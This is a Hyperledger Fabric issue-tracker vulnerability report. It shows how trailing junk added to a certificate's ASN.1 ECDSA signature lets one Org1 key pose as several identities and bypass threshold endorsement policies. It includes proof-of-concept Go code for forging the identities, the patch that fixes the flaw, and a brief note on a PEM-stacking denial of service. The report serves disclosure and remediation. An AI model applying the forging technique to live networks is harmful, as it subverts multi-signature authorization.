<Issue id="44855" key="FAB-17778" number="17778" project="10002" reporter="yacovm" assignee="yacovm" creator="yacovm" type="10004" summary="De-Deduplication by exploiting lenient ASN1 Unmarshaling" priority="3" resolution="10000" status="6" created="2020-04-21 20:25:10.0" updated="2020-05-15 12:11:22.0" resolutiondate="2020-04-27 08:53:15.0" votes="0" watches="10" workflowId="58780" security="10000" archived="N"> <description><! CDATA h2. *Executive summary:*  As we know, Fabric policies usually span multiple organizations.  However, Fabric also supports policies that require a threshold of signatures from the same organization, like- _NoutOf(K, Org1MSP, Org1MSP, ... Org1MSP)_.  Turns out... these are completely broken - it is easy for an owner of a private key of Org1MSP to bypass any threshold of *K>1* signature requirements by altering its identity to the point it successfully impersonates K different identities of the same organization.  There is a mechanism in place that is supposed to counter this, which is a de-duplication of identities.  This mechanism fails to catch the duplication because BCCSP (incorrectly) assumes that a valid ECDSA signature (marshaled with ASN1) contains exactly the required amount of bytes, and - more specifically, doesn't contain trailing bytes. h2. Â   *Technical details for geeks:*  As you all know, x509 based identities are composed of an MSP ID and an x509 PEM encoded certificate.  An x509 certificate has its CA signature on it (ECDSA signature), thus it is part of the MSP identity.  Even though Fabric copes with dual representations of high and low *S* value by canonizing every *S* to the low part of the curve order,  Fabric fails to detect cases where the CA signature has trailing ASN1 junk (as long as the junk was produced with the ASN1 library).  More specifically, if we take an x509 based identity and append some junk to the end of its ASN1 encoding of ECDSA signature, Fabric will unmarshal the ASN1 bytes while ignoring the trailing junk bytes if the signature is +*already*+ in the low *S*.  If it's in the upper half of the curve order, Fabric returns a self marshaled ASN1 signature so there is no problem.  Let's look at the function that converts signatures to low S: {code:java} func SignatureToLowS(k *ecdsa.PublicKey, signature   byte) (  byte, error) { r, s, err := UnmarshalECDSASignature(signature) if err != nil { return nil, err }  s, modified, err := ToLowS(k, s) if err != nil { return nil, err }  if modified { return MarshalECDSASignature(r, s) }  return signature, nil } {code} First we can see, that if the signature is already in the low *S* form, it will not change it and return it as is (end of the function).  This is +exactly where the weakness lies+, because the code doesn't always re-construct the ASN1 structure of the ECDSA signature regardless of whether it is low *S* or not low *S*.  Let's look at it again after adding some prints: {code:java} func SignatureToLowS(k *ecdsa.PublicKey, signature   byte) (  byte, error) { r, s, err := UnmarshalECDSASignature(signature) if err != nil { return nil, err }  // -------------- BEGIN YACOV ADDED THIS ------------ x, err := MarshalECDSASignature(r,s) if err != nil { panic(err) }  fmt.Fprintf(os.Stderr, ">>> we got input of %s but we really should have got %s\n",  hex.EncodeToString(signature), hex.EncodeToString(x))  // --------------END YACOV ADDED THIS ---------------  s, modified, err := ToLowS(k, s) if err != nil { return nil, err }  if modified { return MarshalECDSASignature(r, s) }  return signature, nil }  {code} The function, in my integration test POC prints: {code:java}  e  Org2.peer0  >>> we got input of 304702202c5776a13174e8d59ae7ed1b83da4a6bc86094334901905d3e2335a8d4727bd502204217a33e19e6573be4634f14fcec3ce9c4d4133f2c8c41c734a33b93f0f0ded102012a but we really should have got 304402202c5776a13174e8d59ae7ed1b83da4a6bc86094334901905d3e2335a8d4727bd502204217a33e19e6573be4634f14fcec3ce9c4d4133f2c8c41c734a33b93f0f0ded1 {code} Observe that the function input {color:#0747a6}304702202c5776a13174e8d59ae7ed1b83da4a6bc86094334901905d3e2335a8d4727bd502204217a33e19e6573be4634f14fcec3ce9c4d4133f2c8c41c734a33b93f0f0ded1{color}{color:#de350b}02012a{color} but which is exactly like a canonical representation of an (R,S) ECDSA in ASN1 format, but it has trailing junk of {color:#de350b}02012a{color}.  It's worth to mention, that the x509 verification will *reject* arbitrary trailing bytes because the ASN1 unmarshaling call would return these trailing bytes and the identity verification would fail with an error of: "x509: trailing data after ECDSA parameters" as can be seen  here|https://golang.org/src/crypto/x509/x509.go#L1049 .  This _almost_ made me give up on attempting to perform the attack and I thought it is impossible for a few minutes.  In a last attempt I tried using the ASN1 library itself to append some data, and then discovered that unlike in the previous case, it just silently skips the trailing bytes as can be seen  here|https://play.golang.org/p/Kry3M6py3-T .  h2. *Exploiting the lenient behavior to sidestep policy identity deduplication:*  I went and made an integration test that uses a chaincode with endorsement policy of _OutOf (6, 'Org1MSP.member', 'Org1MSP.member', 'Org1MSP.member', 'Org1MSP.member', 'Org1MSP.member', 'Org1MSP.member')_  And then I just used a single private key of a peer from Org1 to create *6* fake identities from its single identity, and from having the private key via the following method:  First I define two structs:  One for the real representation of an ECDSA signature which has the r value that hides the random nonce, and one that has the s value that uses the private key:  {code} type rs struct { R, S *big.Int } {code}  And another one that has a trailing T (for trash): {code} type RST struct { R, S, T *big.Int } {code}  Next, I take the PEM of the leaf certificate of an endorser and convert its signature to the first correct form:  {code} var cert certificate _, err = asn1.Unmarshal(decodedPEM.Bytes, &cert) if err != nil { panic(err) }  var rs rs _, err = asn1.Unmarshal(cert.SignatureValue.Bytes, &rs) if err != nil { panic(err) }  {code}  Afterwards I just override the signature by adding a trailing junk by using the second struct:  {code} cert.SignatureValue.Bytes, err = asn1.Marshal(RST{ R: rs.R, S: rs.S, T: big.NewInt(42 + int64(i)), })  {code}  Then, I fold back the certificate into the serialized identity and into the endorsement: {code} cert.Raw = nil raw, err := asn1.Marshal(cert) if err != nil { panic(err) }  clone := proto.Clone(in).(*pb.ProposalResponse) clone.Endorsement.Endorser = protoutil.MarshalOrPanic(&msp.SerializedIdentity{ Mspid:   sID.Mspid, IdBytes: pem.EncodeToMemory(&pem.Block{Type: decodedPEM.Type, Bytes: raw}), }) clone.Endorsement.Signature = reSign(clone.Endorsement.Endorser) {code}  The policy gets evaluated successfully and the transaction is deemed valid.  The full POC can be found in the attached git patch.  h2. *The fix:*  To fix this, we need to simply always marshal the ECDSA signature to ASN1 regardless of if it's in the low *S* or the high *S*  {code} func SignatureToLowS(k *ecdsa.PublicKey, signature   byte) (  byte, error) { r, s, err := UnmarshalECDSASignature(signature) if err != nil { return nil, err }  s, _, err = ToLowS(k, s) if err != nil { return nil, err }  return MarshalECDSASignature(r, s) } {code}  Then when I re-run the integration test, I get these lovely warnings in the peers across both orgs:  {code}  e  Org2.peer0  2020-04-21 16:47:47.170 IDT  policies  SignatureSetToValidIdentities -> WARN 091 De-duplicating identity  Org1MSPb2ee60bfbfe8acd55db82d5760438e1ff6848f4169f913694c90c5b9e7ec1595  at index 1 in signature set  e  Org1.peer0  2020-04-21 16:47:47.170 IDT  policies  SignatureSetToValidIdentities -> WARN 24d De-duplicating identity  Org1MSPb2ee60bfbfe8acd55db82d5760438e1ff6848f4169f913694c90c5b9e7ec1595  at index 1 in signature set  e  Org2.peer0  2020-04-21 16:47:47.170 IDT  policies  SignatureSetToValidIdentities -> WARN 092 De-duplicating identity  Org1MSPb2ee60bfbfe8acd55db82d5760438e1ff6848f4169f913694c90c5b9e7ec1595  at index 2 in signature set  e  Org1.peer0  2020-04-21 16:47:47.170 IDT  policies  SignatureSetToValidIdentities -> WARN 24e De-duplicating identity  Org1MSPb2ee60bfbfe8acd55db82d5760438e1ff6848f4169f913694c90c5b9e7ec1595  at index 2 in signature set  e  Org2.peer0  2020-04-21 16:47:47.171 IDT  policies  SignatureSetToValidIdentities -> WARN 093 De-duplicating identity  Org1MSPb2ee60bfbfe8acd55db82d5760438e1ff6848f4169f913694c90c5b9e7ec1595  at index 3 in signature set  e  Org1.peer0  2020-04-21 16:47:47.171 IDT  policies  SignatureSetToValidIdentities -> WARN 24f De-duplicating identity  Org1MSPb2ee60bfbfe8acd55db82d5760438e1ff6848f4169f913694c90c5b9e7ec1595  at index 3 in signature set  e  Org2.peer0  2020-04-21 16:47:47.171 IDT  policies  SignatureSetToValidIdentities -> WARN 094 De-duplicating identity  Org1MSPb2ee60bfbfe8acd55db82d5760438e1ff6848f4169f913694c90c5b9e7ec1595  at index 4 in signature set  e  Org1.peer0  2020-04-21 16:47:47.171 IDT  policies  SignatureSetToValidIdentities -> WARN 250 De-duplicating identity  Org1MSPb2ee60bfbfe8acd55db82d5760438e1ff6848f4169f913694c90c5b9e7ec1595  at index 4 in signature set  e  Org2.peer0  2020-04-21 16:47:47.171 IDT  policies  SignatureSetToValidIdentities -> WARN 095 De-duplicating identity  Org1MSPb2ee60bfbfe8acd55db82d5760438e1ff6848f4169f913694c90c5b9e7ec1595  at index 5 in signature set  e  Org1.peer0  2020-04-21 16:47:47.171 IDT  policies  SignatureSetToValidIdentities -> WARN 251 De-duplicating identity  Org1MSPb2ee60bfbfe8acd55db82d5760438e1ff6848f4169f913694c90c5b9e7ec1595  at index 5 in signature set {code}  and finally: {code}  e  Org1.peer0  2020-04-21 16:47:47.171 IDT  vscc  Validate -> ERRO 253 VSCC error: stateBasedValidator.Validate failed, err validation of endorsement policy for chaincode mycc in tx 5:0 failed: signature set did not satisfy policy {code}  A related (much less important issue) is that we should probably also add checks to the  IsWellFormed|https://github.com/hyperledger/fabric/blob/a282f7132565d509d3ba6d502cd9c07cc5e567f0/msp/mspimpl.go#L827   method, and also check that there are no more bytes after the first PEM block, otherwise a peer can overload the memory of other peers with lots of certificates of the same peer.  However this is merely a denial of service attack, and will cause all peers in the network to crash, and there is little to gain in doing this because you'll get caught pretty fast if logs are at debug level (the PEM are printed).  ></description> </Issue>
